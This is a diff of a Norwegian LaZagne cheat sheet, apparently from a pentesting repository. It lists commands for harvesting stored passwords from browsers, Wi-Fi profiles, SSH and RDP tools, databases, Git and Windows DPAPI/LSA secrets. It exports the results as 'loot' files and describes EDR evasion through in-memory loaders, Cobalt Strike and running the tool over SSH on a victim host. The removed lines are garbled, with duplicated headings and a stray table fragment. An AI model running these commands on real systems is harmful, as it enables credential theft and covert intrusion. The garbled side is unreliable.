@@ -1,42 +1,45 @@
-# 🔍 LaZagne – komplett hurtigreferanse
-
 <!-- language-home-navigation -->
-[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
 
-
-[LaZagne](https://github.com/AlessandroZ/LaZagne) is an open-source post-exploitation application used to retrieve passwords stored on a local computer. It supports Windows, Linux, and macOS across multiple categories including web browsers, email clients, Wi-Fi networks, database management software, sysadmin tools, and memory caches.
+[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)
 
 ---
 
-## 📋 Innholdsfortegnelse
 
-- [[Targeted Category Attacks](#targeted-category-attacks)](#supported-modules--categories)
-- [Installasjon](#installation--binaries)
-- [Installasjon](#linux-credential-harvesting)
+# LaZagne Jukseark
+
+[LaZagne](https://github.com/AlessandroZ/LaZagne) er en åpen kildekode-applikasjon etter utnyttelse som brukes til å hente passord som er lagret på en lokal datamaskin. Den støtter Windows, Linux og macOS på tvers av flere kategorier, inkludert nettlesere, e-postklienter, Wi-Fi-nettverk, programvare for databaseadministrasjon, sysadmin-verktøy og minnebuffere.
+
+---
+
+## Innholdsfortegnelse
+
+- [Støttede moduler og kategorier](#støttede-moduler--kategorier)
+- [Installasjon og binære filer](#installasjon--binære filer)
+- [Linux Credential Harvesting](#linux-credential-harvesting)
 - [Windows Credential Harvesting](#windows-credential-harvesting)
-- [Targeted Category Attacks](#targeted-category-attacks)
-- [Output Formats & File Export](#output-formats--file-export)
-- [Export to Plain Text](#operational-security--edr-avoidance)
+- [målrettede kategoriangrep](#målrettede kategoriangrep)
+- [Utdataformater og fileksport](#output-formats--file-export)
+– [Operational Security & EDR Avoidance](#operational-security--edr-avoidance)
 
 ---
 
-## [Targeted Category Attacks](#targeted-category-attacks)
+## Støttede moduler og kategorier
 
-[Operational Security & EDR Avoidance](#operational-security--edr-avoidance)
-- **Browsers**: Chrome, Firefox, Edge, Opera, Brave, Chromium (history, autofill, cookies, credentials).
-- **Sysadmin Tools**: WinSCP, PuTTY, OpenSSH (`id_rsa` keys / config), RDP / mstsc, FileZilla, Cyberduck, VNC.
-- **| 2611 | vBulletin |**: DBeaver, pgAdmin, Squirrel, Robomongo, SQL Server Management Studio.
-- **Wi-Fi**: Stored WPA2/WPA3 pre-shared keys (PSK) in OS network profiles.
-- **Developer & VCS**: Git credentials (`.git-credentials`, cache), SVN, Docker tokens, AWS CLI credentials.
-- **Email & Chat**: Thunderbird, Outlook, Pidgin, Skype.
-- **Windows Vault & DPAPI**: LSA secrets, DPAPI master keys, Credential Manager vault items.
+LaZagne trekker ut legitimasjon fra dusinvis av applikasjoner gruppert i kategorier:
+- **Nettlesere:** Chrome, Firefox, Edge, Opera, Brave, Chromium (historikk, autofyll, informasjonskapsler, legitimasjon).
+- **Sysadmin-verktøy:** WinSCP, PuTTY, OpenSSH (`id_rsa`-nøkler / config), RDP / mstsc, FileZilla, Cyberduck, VNC.
+- **Databaser:** DBeaver, pgAdmin, Squirrel, Robomongo, SQL Server Management Studio.
+- **Wi-Fi:** Lagrede WPA2/WPA3 forhåndsdelte nøkler (PSK) i OS-nettverksprofiler.
+- **Utvikler og VCS:** Git-legitimasjon (`.git-credentials`, cache), SVN, Docker-tokens, AWS CLI-legitimasjon.
+- **E-post og chat:** Thunderbird, Outlook, Pidgin, Skype.
+- **Windows Vault & DPAPI:** LSA-hemmeligheter, DPAPI-hovednøkler, Credential Manager-hvelvelementer.
 
 ---
 
-## Installasjon
-
+## Installasjon og binære filer
 ```bash
 # Clone the repository
 git clone https://github.com/AlessandroZ/LaZagne.git
@@ -49,56 +52,49 @@ pip install -r requirements.txt
 # Windows: lazagne.exe
 # Linux: laZagne.py
 ```
-
 ---
 
-## Installasjon
+## Linux Credential Harvesting
 
-### 1. Run All Extraction Modules
+### 1. Kjør alle ekstraksjonsmoduler
 ```bash
 python3 laZagne.py all
 ```
-
-### 2. Run with Root / Sudo Privileges (Expands Shadow & Keyring Access)
-Linux Credential Harvesting
+### 2. Kjør med root / Sudo-privilegier (utvider tilgang til skygge og nøkkelring)
+Å kjøre som `root` låser opp systemhemmeligheter, Wi-Fi-profiler i `/etc/NetworkManager` og SSH-nøkler på tvers av alle `/home/*`-kataloger:
 ```bash
 sudo python3 laZagne.py all
 ```
-
-### 3. Extract Passwords from Gnome Keyring / KWallet
+### 3. Trekk ut passord fra Gnome Keyring / KWallet
 ```bash
 python3 laZagne.py sysadmin -k
 ```
-
 ---
 
 ## Windows Credential Harvesting
 
-On Windows, use the standalone executable `lazagne.exe`:
+På Windows bruker du den frittstående kjørbare `lazagne.exe`:
 
-### 1. Extract All Stored Passwords
+### 1. Pakk ut alle lagrede passord
 ```cmd
 lazagne.exe all
 ```
-
-### 2. Run with Elevated Privileges (Admin / SYSTEM)
-On Windows, use the standalone executable `lazagne.exe`:
+### 2. Kjør med forhøyede rettigheter (admin / SYSTEM)
+Trekk ut DPAPI-hovednøkler, LSA-hemmeligheter og bufret domenelegitimasjon:
 ```cmd
 lazagne.exe all -v
 ```
-
-### 3. Extract Passwords for a Specific User (When Running as Admin)
+### 3. Trekk ut passord for en spesifikk bruker (når du kjører som administrator)
 ```cmd
 lazagne.exe all -path "C:\Users\TargetUser\AppData"
 ```
-
 ---
 
-## Targeted Category Attacks
+## Målrettede kategoriangrep
 
-Instead of running all modules, specify target software categories to minimize disk activity and noise:
+I stedet for å kjøre alle moduler, spesifiser målprogramvarekategorier for å minimere diskaktivitet og støy:
 
-### 1. Web Browsers Only
+### 1. Bare nettlesere
 ```bash
 # Linux
 python3 laZagne.py browsers
@@ -106,8 +102,7 @@ python3 laZagne.py browsers
 # Windows
 lazagne.exe browsers
 ```
-
-### 2. Wi-Fi Cleartext Passwords
+### 2. Wi-Fi klartekst-passord
 ```bash
 # Linux (requires root or sudo)
 sudo python3 laZagne.py wifi
@@ -115,8 +110,7 @@ sudo python3 laZagne.py wifi
 # Windows
 lazagne.exe wifi
 ```
-
-### 1. Web Browsers Only
+### 3. Sysadmin og fjerntilgangsverktøy (SSH, RDP, WinSCP, FileZilla)
 ```bash
 # Linux
 python3 laZagne.py sysadmin
@@ -124,8 +118,7 @@ python3 laZagne.py sysadmin
 # Windows
 lazagne.exe sysadmin
 ```
-
-### 2. Wi-Fi Cleartext Passwords
+### 4. Databaseklienter
 ```bash
 # Linux
 python3 laZagne.py databases
@@ -133,40 +126,38 @@ python3 laZagne.py databases
 # Windows
 lazagne.exe databases
 ```
-
-### 3. Sysadmin & Remote Access Tools (SSH, RDP, WinSCP, FileZilla)
+### 5. Utvikler- og Git-legitimasjon
 ```bash
 # Linux
 python3 laZagne.py git
 ```
-
 ---
 
-## Output Formats & File Export
+## Utdataformater og fileksport
 
-Save harvested credentials directly to disk in structured formats:
+Lagre innhentet legitimasjon direkte på disk i strukturerte formater:
 
-### Export to JSON Format
+### Eksporter til JSON-format
 ```bash
 python3 laZagne.py all -oJ -oN /tmp/loot_credentials
 ```
-Output Formats & File Export
+Oppretter `/tmp/loot_credentials.json` som inneholder strukturert legitimasjon, URL-er, brukernavn og klartekstpassord.
 
-### Save harvested credentials directly to disk in structured formats:
+### Eksporter til ren tekst
 ```bash
 python3 laZagne.py all -oT -oN /tmp/loot_credentials
 ```
-Export to JSON Format
+Oppretter `/tmp/loot_credentials.txt`.
 
 ---
 
-## Export to Plain Text
+## Driftssikkerhet og EDR-unngåelse
 
-- **Antivirus Detection**: Standalone `lazagne.exe` is heavily signatured by Windows Defender and commercial EDR solutions.
-- **Obfuscation & In-Memory Execution**: 
-  - Execute via PowerShell reflection or in-memory loaders (`donut`, `execute-assembly` in Cobalt Strike / Sliver).
-  - Use Python source version with a custom virtual environment rather than the packed PyInstaller binary.
-- **Clean Artifacts**: Delete temporary loot files or redirect output directly through standard out over an encrypted C2 beacon or SSH session:
+- **Antivirusdeteksjon:** Frittstående `lazagne.exe` er sterkt signert av Windows Defender og kommersielle EDR-løsninger.
+- **Obfuskering og kjøring i minnet:**
+  - Utfør via PowerShell-refleksjon eller in-memory-lastere (`donut`, `execute-assembly` i Cobalt Strike / Sliver).
+  - Bruk Python-kildeversjonen med et tilpasset virtuelt miljø i stedet for den pakkede PyInstaller-binæren.
+- **Ren artefakter:** Slett midlertidige loot-filer eller omdiriger utdata direkte gjennom standard ut over en kryptert C2-beacon eller SSH-økt:
   ```bash
   ssh victim@192.168.1.50 'python3 -' < laZagne.py all
   ```
